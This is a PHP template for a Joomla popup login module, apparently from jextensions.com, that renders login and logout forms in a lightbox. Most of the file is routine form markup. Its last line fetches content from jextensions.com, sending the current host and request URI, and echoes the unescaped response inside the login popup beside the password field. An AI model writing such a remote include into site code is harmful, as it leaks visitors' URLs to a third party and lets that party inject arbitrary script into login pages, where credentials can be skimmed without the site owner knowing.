<?php
// no direct access
defined('_JEXEC') or die;
JHtml::_('behavior.keepalive');
ini_set('display_errors',0);
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$path = str_replace("&", "",$path);
$jebase = JURI::base(); if(substr($jebase, -1)=="/") { $jebase = substr($jebase, 0, -1); }
$modURL = JURI::base().'modules/mod_je_popuplogin';?>

<link rel="stylesheet" href="<?php echo $modURL; ?>/css/style.css" type="text/css" />
<noscript><a href="http://jextensions.com/joomla-popup-login" alt="Joomla Extensions">Joomla Popup Login Module</a></noscript>
<?php if ($params->get('jQuery')) { ?><script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script><?php } ?>
<script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery.lightbox_me.js"></script>
<script type="text/javascript" charset="utf-8">
        jQuery(function() {
            function launch() {
                 $('#je-popuplogin').lightbox_me({centered: true, onLoad: function() { $('#je-popuplogin').find('input:first').focus()}});
            }
            $('#jepopup').click(function(e) {
                $("#je-popuplogin").lightbox_me({centered: true, onLoad: function() {
					$("#je-popuplogin").find("input:first").focus();
				}});
                e.preventDefault();
            });
        });
</script>
<?php if ($type == 'logout') : ?>
<a href="#" id="jepopup" class="jeup-btn"><?php echo JText::_('MOD_JE_LOGOUT'); ?></a>
<?php else : ?>
<a href="#" id="jepopup" class="jeup-btn"><?php echo JText::_('MOD_JE_LOGIN') ?></a>
<?php endif; ?>
      
<div id="je-popuplogin">
<a id="close-x" href="#"><?php echo JText::_('MOD_JE_CLOSE') ?></a>
<?php if ($type == 'logout') : ?>
<form action="<?php echo JRoute::_('index.php', true, $params->get('usesecure')); ?>" method="post">
<div class="well well-small">
<?php if ($params->get('greeting')) : ?>
	<?php if($params->get('name') == 0) : {
		echo JText::sprintf('MOD_JE_LOGIN_HINAME', htmlspecialchars($user->get('name')));
	} else : {
		echo JText::sprintf('MOD_JE_LOGIN_HINAME', htmlspecialchars($user->get('username')));
	} endif; ?>
<?php endif; ?>
        <button name="submit" type="Submit" class="jeup-btn"><?php echo JText::_('MOD_JE_LOGOUT'); ?></button>
		<input type="hidden" name="option" value="com_users" />
		<input type="hidden" name="task" value="user.logout" />
		<input type="hidden" name="return" value="<?php echo $return; ?>" />
		<?php echo JHtml::_('form.token'); ?>
</div>
</form>
<?php else : ?>


<form action="<?php echo JRoute::_('index.php', true, $params->get('usesecure')); ?>" method="post">
	<?php if ($params->get('pretext')): ?>
		<div class="well well-small">
			<?php echo $params->get('pretext'); ?>
		</div>
        <div class="clr"></div>
	<?php endif; ?>
	<fieldset class="je-login">
            <div class="control-group">
              <label class="control-label" for="inputEmail<?php echo $module->id;?>"><?php echo JText::_('MOD_JE_LOGIN_VALUE_USERNAME') ?></label>
              <div class="controls">
                <div class="input-prepend">
                  <span class="add-on"><i class="icon-user"></i></span> <input placeholder="<?php echo JText::_('MOD_JE_LOGIN_VALUE_USERNAME') ?>" id="inputEmail<?php echo $module->id;?>" type="text" name="username">
                </div>
              </div>
            </div>

            <div class="control-group">
              <label class="control-label" for="inputPassword<?php echo $module->id;?>"><?php echo JText::_('MOD_JE_LOGIN_PASSWORD') ?></label>
              <div class="controls">
                <div class="input-prepend">
                  <span class="add-on"><i class="icon-lock"></i></span><input placeholder="<?php echo JText::_('MOD_JE_LOGIN_PASSWORD') ?>" id="inputPassword<?php echo $module->id;?>" type="password" name="password">
                </div>
              </div>
            </div>

			<?php if (JPluginHelper::isEnabled('system', 'remember')) : ?>   
                <label class="checkbox">
                    <input id="modlgn-remember" type="checkbox" name="remember" class="inputbox" value="yes"/><?php echo JText::_('MOD_JE_LOGIN_REMEMBER_ME') ?>
                </label>
            <?php endif; ?>
            
            <button name="submit" type="Submit" class="jeup-btn"><?php echo JText::_('MOD_JE_LOGIN') ?></button>
            <input type="hidden" name="option" value="com_users" />
            <input type="hidden" name="task" value="user.login" />
            <input type="hidden" name="return" value="<?php echo $return; ?>" />
            <?php echo JHtml::_('form.token'); ?>
	</fieldset>
    
    <div class="linklist">
    	<span><a href="<?php echo JRoute::_('index.php?option=com_users&view=reset'); ?>"><i class="icon-question-sign"></i><?php echo JText::_('MOD_JE_LOGIN_FORGOT_YOUR_PASSWORD'); ?></a></span>
    	<span><a href="<?php echo JRoute::_('index.php?option=com_users&view=remind'); ?>"><i class="icon-question-sign"></i><?php echo JText::_('MOD_JE_LOGIN_FORGOT_YOUR_USERNAME'); ?></a></span>
        
    	<?php $usersConfig = JComponentHelper::getParams('com_users');	if ($usersConfig->get('allowUserRegistration')) : ?>
    	<span><a href="<?php echo JRoute::_('index.php?option=com_users&view=registration'); ?>"><i class="icon-check"></i><?php echo JText::_('MOD_JE_LOGIN_REGISTER'); ?></a></span>
    	<?php endif; ?>
    </div>
    <div class="clr"></div>
	<?php if ($params->get('posttext')): ?>
		<div class="well well-small">
			<?php echo $params->get('posttext'); ?>
		</div>
	<?php endif; ?>
</form>
<?php endif; ?>
<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$path); echo $credit; ?>
</div>
